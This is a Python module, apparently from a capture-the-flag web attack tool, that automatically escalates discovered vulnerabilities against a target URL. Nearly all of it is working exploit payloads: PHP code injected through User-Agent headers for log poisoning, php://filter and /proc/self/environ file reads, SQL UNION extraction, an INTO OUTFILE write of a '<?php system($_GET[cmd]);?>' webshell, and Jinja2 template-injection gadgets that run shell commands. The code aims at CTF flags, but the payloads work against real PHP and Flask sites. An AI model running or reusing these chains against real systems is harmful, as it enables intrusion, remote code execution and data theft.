"""yang_web.core.advanced_scanner 子模块 _chain（自 advanced_scanner.py 拆分，请勿手工重排）。"""

from __future__ import annotations
import re
import ssl
import socket
import time
import threading
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Tuple, Callable, Set
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError
from collections import defaultdict

from ._common import (find_flag, http_request)



# ═══════════════════════════════════════════════════════════
#  3. Attack Chain Engine — 自动二阶段利用
# ═══════════════════════════════════════════════════════════

class AttackChainEngine:
    """攻击链引擎 — 当发现某种漏洞后自动尝试升级攻击.

    链条示例:
        LFI发现 → 尝试 Log Poisoning → 获取 RCE → 读 Flag
        SQLi发现 → 尝试 UNION → 尝试读取文件 → 写 Webshell
        SSTI发现 → 尝试 Jinja2 RCE → cat /flag
    """

    # 升级链定义
    CHAINS = {
        "LFI": [
            # LFI → Log Poisoning → RCE
            {
                "name": "LFI→日志污染→RCE",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Apache日志污染",
                        "payloads": [
                            {"param": "file", "value": "/var/log/apache2/access.log",
                             "method": "replace", "header_inject": {"User-Agent": "<?php system('cat /flag');?>"}},
                            {"param": "file", "value": "/var/log/apache2/error.log"},
                            {"param": "file", "value": "/var/log/nginx/access.log",
                             "header_inject": {"User-Agent": "<?php system('cat /flag');?>"}},
                        ],
                    },
                ],
            },
            # LFI → PHP Filter Chain → RCE
            {
                "name": "LFI→PHP Filter Chain→源码",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "php://filter读源码",
                        "payloads": [
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=index.php"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=flag.php"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=flag"},
                            {"param": "file", "value": "php://filter/convert.base64-encode/resource=config.php"},
                        ],
                    },
                ],
            },
            # LFI → /proc/self/environ
            {
                "name": "LFI→环境变量→Flag",
                "detect_condition": lambda r: r.get("type") == "LFI" and r.get("confidence", 0) >= 30,
                "stages": [
                    {
                        "name": "环境变量读取",
                        "payloads": [
                            {"param": "file", "value": "/proc/self/environ"},
                            {"param": "file", "value": "/proc/1/environ"},
                            {"param": "file", "value": "/proc/self/cmdline"},
                        ],
                    },
                ],
            },
        ],
        "RCE": [
            # RCE → 读 flag
            {
                "name": "RCE→读Flag文件",
                "detect_condition": lambda r: r.get("type") == "RCE" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Flag文件读取",
                        "payloads": [
                            {"value": "cat /flag", "method": "replace"},
                            {"value": "cat /flag.txt", "method": "replace"},
                            {"value": "cat /fla*", "method": "replace"},
                            {"value": "cat /f*", "method": "replace"},
                            {"value": "cat flag.txt", "method": "replace"},
                            {"value": "tac /flag", "method": "replace"},
                            {"value": "nl /flag", "method": "replace"},
                            {"value": "find / -name 'flag*' 2>/dev/null | head -5", "method": "replace"},
                        ],
                    },
                ],
            },
        ],
        "SQLi": [
            # SQLi → UNION提取 → 读flag表
            {
                "name": "SQLi→UNION提权→读Flag",
                "detect_condition": lambda r: r.get("type") == "SQLi" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "UNION SELECT 读数据",
                        "payloads": [
                            {"value": "' UNION SELECT 1,flag,3 FROM flag-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,flag,3 FROM flags-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,database(),3-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag'-- ", "method": "append"},
                            {"value": "' UNION SELECT 1,load_file('/flag'),3-- ", "method": "append"},
                        ],
                    },
                ],
            },
            # SQLi → 写文件到Web目录 → Webshell
            {
                "name": "SQLi→写Webshell",
                "detect_condition": lambda r: r.get("type") == "SQLi" and r.get("confidence", 0) >= 60,
                "stages": [
                    {
                        "name": "INTO OUTFILE写文件",
                        "payloads": [
                            {"value": "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'-- ", "method": "append"},
                            {"value": "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/tmp/shell.php'-- ", "method": "append"},
                        ],
                    },
                ],
            },
        ],
        "SSTI": [
            # SSTI → RCE → Flag
            {
                "name": "SSTI→Jinja2 RCE→Flag",
                "detect_condition": lambda r: r.get("type") == "SSTI" and r.get("confidence", 0) >= 50,
                "stages": [
                    {
                        "name": "Jinja2 RCE链",
                        "payloads": [
                            {"value": "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}", "method": "replace"},
                            {"value": "{{ config.__init__.__globals__['os'].popen('cat /flag').read() }}", "method": "replace"},
                            {"value": "{{ ''.__class__.__mro__[1].__subclasses__()[400]('/flag').read() }}", "method": "replace"},
                            {"value": "{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}", "method": "replace"},
                        ],
                    },
                ],
            },
        ],
    }

    def __init__(self, url: str, timeout: int = 5):
        self.url = url
        self.timeout = timeout
        self.results: List[dict] = []
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    def chain(self, vuln_results: List[dict], on_progress=None, on_flag=None) -> dict:
        """Execute attack chains based on discovered vulnerabilities.

        Args:
            vuln_results: List of vulnerability results from analyze_url()
            on_progress: Callable(stage, item, status)
            on_flag: Callable(flag)

        Returns:
            {"flag": str or None, "chains_executed": [...], "vulns_found": [...]}
        """
        chains_executed = []
        found_flag = None

        def _emit(stage, item, status):
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        for vr in vuln_results:
            vtype = vr.get("type", "")
            if vtype not in self.CHAINS:
                continue

            for chain_def in self.CHAINS[vtype]:
                if self._cancelled or found_flag:
                    break
                if not chain_def["detect_condition"](vr):
                    continue

                chain_result = {"chain": chain_def["name"], "vuln_type": vtype,
                               "stages_executed": [], "success": False}
                _emit("chain", chain_def["name"], f"触发升级链: {vtype}")

                for stage in chain_def["stages"]:
                    if self._cancelled or found_flag:
                        break
                    stage_result = {"stage": stage["name"], "payloads_tried": 0,
                                   "hits": []}
                    _emit("chain_stage", stage["name"], f"执行阶段")

                    for pdef in stage["payloads"]:
                        if self._cancelled or found_flag:
                            break
                        stage_result["payloads_tried"] += 1

                        param = pdef.get("param", "")
                        payload = pdef.get("value", "")
                        method = pdef.get("method", "replace")
                        header_inject = pdef.get("header_inject", {})

                        try:
                            # Build request
                            extra_headers = dict(header_inject) if header_inject else None
                            parsed = urllib.parse.urlparse(self.url)
                            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

                            if param and param in params:
                                if method == "replace":
                                    params[param] = [payload]
                                else:
                                    params[param] = [params[param][0] + payload]
                            elif param:
                                params[param] = [payload]

                            new_query = urllib.parse.urlencode(params, doseq=True)
                            test_url = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, new_query, parsed.fragment
                            ))

                            resp = http_request(test_url, timeout=self.timeout,
                                               headers=extra_headers)
                            body = resp.get("body", "")

                            # Check for flag
                            f = find_flag(body)
                            if f:
                                found_flag = f
                                stage_result["hits"].append({"payload": payload, "flag": f})
                                if on_flag:
                                    try:
                                        on_flag(f)
                                    except Exception:
                                        pass
                                chain_result["success"] = True
                                _emit("chain_flag", stage["name"], f"🎉 {f}")
                                break

                            # Check for RCE confirmation (uid=, root:, etc.)
                            if "uid=" in body or "root:" in body:
                                stage_result["hits"].append({"payload": payload, "evidence": "RCE confirmed"})
                                _emit("chain_hit", stage["name"], f"✅ RCE确认: {payload[:40]}")
                        except Exception:
                            pass

                    chain_result["stages_executed"].append(stage_result)

                chains_executed.append(chain_result)

        return {
            "flag": found_flag,
            "chains_executed": chains_executed,
        }
